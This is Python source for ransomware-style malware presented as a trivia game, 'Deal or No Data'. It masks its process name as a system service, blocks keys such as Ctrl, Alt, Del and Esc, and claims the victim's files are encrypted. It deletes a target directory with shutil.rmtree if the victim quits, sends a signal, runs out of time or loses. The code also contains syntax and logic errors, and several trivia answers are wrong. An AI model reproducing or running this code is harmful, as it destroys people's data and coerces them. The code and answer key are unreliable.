import os
import time
import atexit
import signal
import sys
import shutil
import random
import keyboard
import platform
import subprocess
import tkinter as tk
from tkinter import messagebox

operating_system = platform.system()

target_drive = ""

if operating_system == "Linux":
    target_drive = "/path/to/directory/"
elif operating_system == "Windows":
    Target_drive = "C:\\path\to\directory\"
else:
    print(f"Unknown operating system: {operating_system}")

def polymorphic_windows_function():
    code = [
        "System",
        "Windows Logon Application",
        "Windows Start-Up Application",
        "Client Server Runtime Process",
        "Windows Session Manager",
        "Windows Shell Experience Host",
        "Windows Explorer"
    ]

    selected_code = random.choice(code)

    set_process_title(selected_code)

def polymorphic_linux_function():
    code = [
        "agent",
        "blueman-applet",
        "dconf-service",
        "pipewire",
        "xfconfd",
        "xiccd",
        "wireplumber"
    ]

    selected_code = random.choice(code)

    set_process_title(selected_code)

def set_process_title(title):
    system = platform.system()
    
    if system == "Windows":
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    elif system == "Linux":
        import setproctitle
        setproctitle.setproctitle(title)
    else:
        print(f"Unsupported operating system: {system}")

def main():
    operating_system = platform.system()

    if operating_system == "Linux":
        polymorphic_linux_function()
    elif operating_system == "Windows":
        polymorphic_windows_function()
    else:
        print("Unsupported operating system")

def killswitch():
    print("You were advised not to kill the game. KillSwitch Activated!")
        
    command_to_execute = shutil.rmtree(target_drive)
    try:
        subprocess.run(command_to_execute, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error executing KillSwitch: {e}")
            
def signal_handler(sig, frame):
    print(f"Detected signal {sig}. Activating KillSwitch!")
    killswitch()
    sys.exit(1)
        
atexit.register(killswitch)
    
for sig in [signal.SIGINT, signal.SIGTERM]:
    signal.signal(sig, signal_handler)              
        
subprocess.run(["python", "lock.py"])
messagebox.showwarning("Let's PLay A Game","YOUR FILES HAVE BEEN ENCRYPTED! But you have a chance to win them all back. KILLING/EXITING THIS GAME WILL RESULT IN THE IMMEDIATE LOSS OF ALL FILES! That's correct I did say you have a chance to win your files back. This isn't about money! You were selected to play this game because of your extremely high toxicity level. I DON'T GIVE A SHIT ABOUT MONEY! Now then, let me explain how this game works before you begin." )

messagebox.showinfo("INSTRUCTIONS", "1:: Each encrypted file is represented as a briefcase, you must first select a briefcase then click 'choose briefcase'. Each briefcase also contains a question for you to answer |2:: Click 'Answer Question' to be presented with the question from the briefcase you just selected. You will have 20 seconds to answer the question. If the timer runs out this will count as an incorrect answer. If you answer the question correctly the file in the briefcase is safe. |3:: Each correct answer increases your score by one point, you need 30 points to win. |4:: The game has a 30 minute time limit, what this means is if you do not have 30 points before the 30 minute timer runs out YOU LOSE THE GAME AND THE FILES. IF YOU ARE SO SMART AND SO MUCH BETTER THAN EVERYONE ELSE THIS SHOULD BE A VERY SIMPLE TASK FOR YOU TO COMPLETE SUCCESSFULLY.")

messagebox.showinfo("START GAME", "It's Time To PLay DEAL OR NO DATA") 

class DealOrNoDataGame:
    def resource_path(relative_path):
       
       try:
           base_path = sys._MEIPASS
       except Exception:
           base_path = os.path.abspath(".")

       return os.path.join(base_path, relative_path)

    def __init__(self, root):
        self.root = root
        self.root.attributes('-fullscreen', True)
        self.root.title("Deal or No Data")

        self.background_image = tk.PhotoImage(resource_path(file="background.png"))
        self.banker_image = tk.PhotoImage(resource_path(file="banker.png"))
        self.briefcase_images = [tk.PhotoImage(resource_path(file=f"briefcase{i+1}.png")) for i in range(10)]

        self.briefcases = self.load_briefcases()
        self.remaining_briefcases = self.briefcases.copy()

        self.current_question = ""
        self.question_timer_running = False
        self.question_timer_seconds = 20
        self.game_timer_running = False
        self.game_timer_seconds = 1800
        self.score = 0
        self.create_widgets()

    def load_briefcases(self):
        directory = target_drive
        briefcases = []
        for foldername, subfolders, filenames in os.walk(directory):
            for filename in filenames:
                briefcases.append(os.path.join(foldername, filename))
        random.shuffle(briefcases)
        return briefcases

    def create_widgets(self):
        background_label = tk.Label(self.root, image=self.background_image)
        background_label.place(relwidth=1, relheight=1)

        self.label = tk.Label(self.root, text="Choose a briefcase:")
        self.label.pack(pady=10)

        self.briefcase_listbox = tk.Listbox(self.root, selectmode=tk.SINGLE, height=10)
        for i, briefcase in enumerate(self.remaining_briefcases):
            self.briefcase_listbox.insert(i, f"Briefcase {i+1}")
        self.briefcase_listbox.pack(pady=10)

        self.choose_button = tk.Button(self.root, text="Choose Briefcase", command=self.choose_briefcase)
        self.choose_button.pack(pady=10)

        self.ask_question_button = tk.Button(self.root, text="Answer Question", command=self.ask_question)
        self.ask_question_button.pack(pady=10)

        self.game_timer_label = tk.Label(self.root, text="", font=("Arial", 14))
        self.game_timer_label.place(x=50, y=20)

        self.score_label = tk.Label(self.root, text=f"Score: {self.score}")
        self.score_label.pack(pady=10)

        self.start_game_timer()

    def choose_briefcase(self):
        if not self.question_timer_running:
            self.start_question_timer()

        if self.remaining_briefcases:
            selected_index = self.briefcase_listbox.curselection()
            if not selected_index:
                messagebox.showinfo("Error", "Please choose a briefcase.")
            else:
                selected_index = selected_index[0]
                chosen_briefcase = self.remaining_briefcases.pop(selected_index)
                messagebox.showinfo("Chosen Briefcase", f"You chose {chosen_briefcase}")

                self.briefcase_listbox.delete(selected_index)

                if not self.remaining_briefcases:
                    shutil.rmtree(target_drive)
                    messagebox.showinfo("Game Over", "No chance of you winning at this point. Game called on account of your idiocy. YOU LOST!")
                    self.root.destroy()
                else:
                    self.choose_button['state'] = 'normal'
        else:
            shutil.rmtree(target_drive)
            messagebox.showinfo("No Briefcases", "You've ran out of briefcases. GAME OVER!")

    def ask_question(self):
        if self.remaining_briefcases:
            jeopardy_questions = [
                "In logical argument and mathematical proof, a symbol consisting of three dots placed to form an upright triangle is used to represents which word?",
                "The world capital cities of Vienna, Bratislava, and Budapest all lie along what river, the second-longest in Europe?",
                "Which two months of the year are named for mortal men?",
                "What is the metric unit, consisting of 10,000 square meters, that is the primary measure of land in most countries?",
                "In 2022, the U.S. Treasury minted landmark quarters featuring what 'I Know Why the Caged Bird Sings' author?",
                "El Prat airport is located in which city on the Mediterranean Sea, which held the 1992 Summer Olympics?",
                "Deglutition is the scientific term for what common bodily function that humans do hundreds of times a day?",
                "In what country was Haagen-Dazs ice cream developed?",
                "What was the name of the commission established to investigate the JFK assassination?",
                "In what Fox teen drama series did character Seth Cohen claim to have invented the holiday of Chrismukkah?",
                "What does SMS stand for in the context of cellular communications?",
                "Netball, water polo, and Olympic rugby are all played with how many players per team?",
                "What 110-mile-per-hour air currents circle Earth's tropopause in a westerly direction?",
                "What man was the running mate of Lyndon B. Johnson in 1964? This man's initials are famously H.H.H.",
                "The first McDonald's restaurant was opened in what state? We're talking about the very first McDonald's, not the first franchise location.",
                "When ignoring the stem, how many points does the maple leaf on the Canadian flag have?",
                "1987 was the first time in 13 years that what American woman did not win a tennis Grand Slam event?",
                "Is the father Mark Darcy or new flame Jack? So goes the plot of what 2016 movie sequel?",
                "In 1756, Voltaire claimed that none of the three words in what influential political entity's name were accurate?",
                "What frequently-misnomered mammal has fingerprints so indistinguishable from humans that they have occasionally been wrongfully collected as evidence at crime scenes?",
                "What color, aside from their black trim, were the original Converse All-Stars Chuck Taylor basketball shoes when they were first produced in 1917?",
                "Floria is the first name of what titular Puccini opera heroine, who is herself an opera singer?",
                "In the brewing process, wort contains the amino acids that provide what lucky, rich element to the yeast?",
                "Craigslist is named after its founder. What is Craig's seven-letter two-syllable 'N' last name?",
                "In which sport are barani, rudolph, and randolph all techniques?",
                "Who collaborated with Karl Marx to produce “The Communist Manifesto”?",
                "Which instrument is associated with Earl ‘Bud’ Powell?",
                "In which branch of the arts is Katherine Dunham famous?",
                "Which architect designed the Woolworth Building in New York City?",
                "Hamilton Kindley Field international airport is in which country?",
                "At which hospital did the first heart transplant take place?",
                "Ken Thompson and Dennis Ritchie co-created which operating system?",
                "A 'crepuscular' animal becomes active at what time?",
                "What were the earliest forms of contraceptive made from?",
                "What was the first movie to be rated PG-13?",
                "Who was the first person to suggest Daylight Savings Times?",
                "Among land animals, what species has the largest eyes?",
                "What historical figure was assassinated near the Miljacka River in 1914?",
                "So far, which continent has hosted the Olympics the most times?",
                "What is the legislature of the Netherlands called?",
                "In 1612, who became the first person to observe the planet Neptune?",
                "What is the world’s most venomous fish?",
                "Emetophobia is the fear of?",
                "What insect has the shortest life span?",
                "Who wrote Around the World in 80 Days?",
                "John Wesley founded what Christian denomination in 1738?",
                "In 2018, a bag of 27 what were discovered by a Fisherman in Siberia?",
                "Crying after sex is a normal response and is also called what?",
                "What famous actress once tried to hire a hitman to kill her?",
                "How has the Statue of Liberty changed since it was built?",
                "Which creatures produce gossamer?",
                "What is the only king in a deck of cards without a mustache?",
                "What is the little dot above a lowercase “i” or “j” called?",
                "What is the capital of France?",
                "Who wrote 'Romeo and Juliet'?",
                "In which year did Christopher Columbus reach the Americas?",
                "What is the largest mammal in the world?",
                "How many continents are there?",
                "What is the square root of 144?",
                "Who painted the Mona Lisa?",
                "Which planet is known as the Red Planet?",
                "Who is known as the 'Father of Computers'?",
                "What is the currency of Japan?",
                "Who is the author of 'To Kill a Mockingbird'?",
                "What is the speed of light?",
                "In which year did World War II end?",
                "What is the largest ocean on Earth?",
                "Who wrote 'The Great Gatsby'?",
                "What is the tallest mountain in the world?",
                "What is the capital of Australia?",
                "Who discovered penicillin?",
                "What is the chemical symbol for gold?",
                "Which country is known as the 'Land of the Rising Sun'?"
            ]
            self.current_question = random.choice(jeopardy_questions)
            self.show_question_window()
        else:
            messagebox.showinfo("No Briefcases", "You've chosen all the briefcases. Please start a new game.")

    def show_question_window(self):
        question_window = tk.Toplevel(self.root)
        question_window.title("?Question?")

        question_label = tk.Label(question_window, text=self.current_question, font=("Arial", 14))
        question_label.pack(pady=10)

        self.question_timer_seconds = 20
        question_timer_label = tk.Label(question_window, text="", font=("Arial", 12))
        question_timer_label.pack(pady=10)

        answer_entry = tk.Entry(question_window, width=30)
        answer_entry.pack(pady=10)

        submit_answer_button = tk.Button(
            question_window,
            text="Submit Answer",
            command=lambda: self.submit_answer_in_question(answer_entry.get(), question_window, question_timer_label)
        )
        submit_answer_button.pack(pady=10)

        self.update_question_timer(question_window, question_timer_label)

    def submit_answer_in_question(self, player_answer, question_window, question_timer_label):
        if self.question_timer_running:
            correct_answer = self.correct_answer(self.current_question).strip().lower()
            if player_answer == correct_answer:
               messagebox.showinfo("Correct!", "Congratulations! Your answer is correct.")
               self.score += 1
               self.score_label.config(text=f"Score: {self.score}")

               if self.score == 30:
                   subprocess.run(["python", "open.py"])
                   messagebox.showinfo("You Win!", "Congratulations! You've reached the winning score of 30 points.")
                   self.root.destroy()
               else:
                   self.reset_question()
                   question_window.destroy()
            else:
                messagebox.showinfo("Incorrect", "Wrong!, your answer is incorrect.")
                self.reset_question()
                question_window.destroy()
        else:
            messagebox.showinfo("No Question", "Please ask a question before submitting an answer.")


    def update_question_timer(self, question_window, question_timer_label):
        if self.question_timer_running and self.question_timer_seconds > 0:
            minutes, seconds = divmod(self.question_timer_seconds, 60)
            question_timer_label.config(text=f"Time Remaining: {minutes:02d}:{seconds:02d}")
            self.question_timer_seconds -= 1
            self.root.after(1000, lambda: self.update_question_timer(question_window, question_timer_label))
        else:
            self.time_up()

    def update_game_timer(self):
        if self.game_timer_running and self.game_timer_seconds > 0:
            minutes, seconds = divmod(self.game_timer_seconds, 60)
            self.game_timer_label.config(text=f"Game Time: {minutes:02d}:{seconds:02d}")
            self.game_timer_seconds -= 1
            self.root.after(1000, self.update_game_timer)
        else:
            self.game_over()

    def time_up(self):
        if self.question_timer_running:
            self.question_timer_running = False
            messagebox.showinfo("Time's Up", "Sorry, time is up. Your answer is incorrect.")
            self.reset_question()

    def game_over(self):
        if self.game_timer_running:
            self.game_timer_running = False
            shutil.rmtree(target_drive)
            messagebox.showinfo("Game Over", "Sorry, you ran out of time. The game is over.")
            self.root.destroy()

    def start_game_timer(self):
        self.game_timer_running = True
        self.update_game_timer()

    def start_question_timer(self):
        self.question_timer_running = True

    def submit_answer(self):
        messagebox.showinfo("Error", "Please ask a question before submitting an answer.")

    def reset_question(self):
        self.current_question = ""
        self.choose_button['state'] = 'normal'

    @staticmethod
    def correct_answer(question):
        answers = {
            "In logical argument and mathematical proof, a symbol consisting of three dots placed to form an upright triangle is used to represents which word?": "Therefore",
            "The world capital cities of Vienna, Bratislava, and Budapest all lie along what river, the second-longest in Europe?": "Danube",
            "Which two months of the year are named for mortal men?": "July and August",
            "What is the metric unit, consisting of 10,000 square meters, that is the primary measure of land in most countries?": "Hectare",
            "In 2022, the U.S. Treasury minted landmark quarters featuring what 'I Know Why the Caged Bird Sings' author?": "Maya Angelou",
            "El Prat airport is located in which city on the Mediterranean Sea, which held the 1992 Summer Olympics?": "Barcelona",
            "Deglutition is the scientific term for what common bodily function that humans do hundreds of times a day?": "Swallowing",
            "In what country was Haagen-Dazs ice cream developed?": "The United States",
            "What was the name of the commission established to investigate the JFK assassination?": "Warren Commission",
            "In what Fox teen drama series did character Seth Cohen claim to have invented the holiday of Chrismukkah?": "The O.C.",
            "What does SMS stand for in the context of cellular communications?": "Short Message Service",
            "Netball, water polo, and Olympic rugby are all played with how many players per team?": "Seven",
            "What 110-mile-per-hour air currents circle Earth's tropopause in a westerly direction?": "Jet stream",
            "What man was the running mate of Lyndon B. Johnson in 1964? This man's initials are famously H.H.H.": "Hubert Horatio Humphrey Jr",
            "The first McDonald's restaurant was opened in what state? We're talking about the very first McDonald's, not the first franchise location.": "California",
            "When ignoring the stem, how many points does the maple leaf on the Canadian flag have?": "11",
            "1987 was the first time in 13 years that what American woman did not win a tennis Grand Slam event?": "Chris Evert",
            "Is the father Mark Darcy or new flame Jack? So goes the plot of what 2016 movie sequel?": "Bridget Jones's Baby",
            "In 1756, Voltaire claimed that none of the three words in what influential political entity's name were accurate?": "Holy Roman Empire",
            "What frequently-misnomered mammal has fingerprints so indistinguishable from humans that they have occasionally been wrongfully collected as evidence at crime scenes?": "Koalas",
            "What color, aside from their black trim, were the original Converse All-Stars Chuck Taylor basketball shoes when they were first produced in 1917?": "Brown",
            "Floria is the first name of what titular Puccini opera heroine, who is herself an opera singer?": "Tosca",
            "In the brewing process, wort contains the amino acids that provide what lucky, rich element to the yeast?": "Nitrogen",
            "Craigslist is named after its founder. What is Craig's seven-letter two-syllable 'N' last name?": "Newmark",
            "In which sport are barani, rudolph, and randolph all techniques?": "Trampolining",
            "Who collaborated with Karl Marx to produce “The Communist Manifesto”?": "Friedrich Engels",
            "Which instrument is associated with Earl ‘Bud’ Powell?": "Piano",
            "In which branch of the arts is Katherine Dunham famous?": "Ballet",
            "Which architect designed the Woolworth Building in New York City?": "Gilbert Cass",
            "Hamilton Kindley Field international airport is in which country?": "Bermuda",
            "At which hospital did the first heart transplant take place?": "Groote Schuur Hospital",
            "Ken Thompson and Dennis Ritchie co-created which operating system?": "Unix",
            "A 'crepuscular' animal becomes active at what time?": "Dusk",
            "What were the earliest forms of contraceptive made from?": "Crocodile Dung",
            "What was the first movie to be rated PG-13?": "Red Dawn",
            "Who was the first person to suggest Daylight Savings Times?": "Benjamin Franklin",
            "Among land animals, what species has the largest eyes?": "Ostrich",
            "What historical figure was assassinated near the Miljacka River in 1914?": "Archduke Franz Ferdinand",
            "So far, which continent has hosted the Olympics the most times?": "Europe",
            "What is the legislature of the Netherlands called?": "The States General",
            "In 1612, who became the first person to observe the planet Neptune?": "Galileo",
            "What is the world’s most venomous fish?": "Stonefish",
            "Emetophobia is the fear of?": "Fear of Vomit",
            "What insect has the shortest life span?": "Mayflies",
            "Who wrote Around the World in 80 Days?": "Jules Verne",
            "John Wesley founded what Christian denomination in 1738?": "Methodist",
            "In 2018, a bag of 27 what were discovered by a Fisherman in Siberia?": "Human hands",
            "Crying after sex is a normal response and is also called what?": "Postcoital Dysphoria",
            "What famous actress once tried to hire a hitman to kill her?": "Angelina Jolie",
            "How has the Statue of Liberty changed since it was built?": "It changed color",
            "Which creatures produce gossamer?": "A spider",
            "What is the only king in a deck of cards without a mustache?": "King of hearts",
            "What is the little dot above a lowercase “i” or “j” called?": "Tittle",
            "What is the capital of France?": "paris",
            "Who wrote 'Romeo and Juliet'?": "shakespeare",
            "In which year did Christopher Columbus reach the Americas?": "1492",
            "What is the largest mammal in the world?": "blue whale",
            "How many continents are there?": "7",
            "What is the square root of 144?": "12",
            "Who painted the Mona Lisa?": "da vinci",
            "Which planet is known as the Red Planet?": "mars",
            "Who is known as the 'Father of Computers'?": "alan turing",
            "What is the currency of Japan?": "yen",
            "Who is the author of 'To Kill a Mockingbird'?": "harper lee",
            "What is the speed of light?": "299,792 kilometers per second",
            "In which year did World War II end?": "1945",
            "What is the largest ocean on Earth?": "pacific",
            "Who wrote 'The Great Gatsby'?": "f. scott fitzgerald",
            "What is the tallest mountain in the world?": "mount everest",
            "What is the capital of Australia?": "canberra",
            "Who discovered penicillin?": "alexander fleming",
            "What is the chemical symbol for gold?": "au",
            "Which country is known as the 'Land of the Rising Sun'?": "japan"
        }
        return answers.get(question, "unknown")

if __name__ == "__main__":
    main()
    root = tk.Tk()
    game = DealOrNoDataGame(root)
    key = "windows", "menu", "ctrl", "alt", "del", "app", "f4", "enter", "esc", "command"
    keyboard.block_key(key)
    root.mainloop()
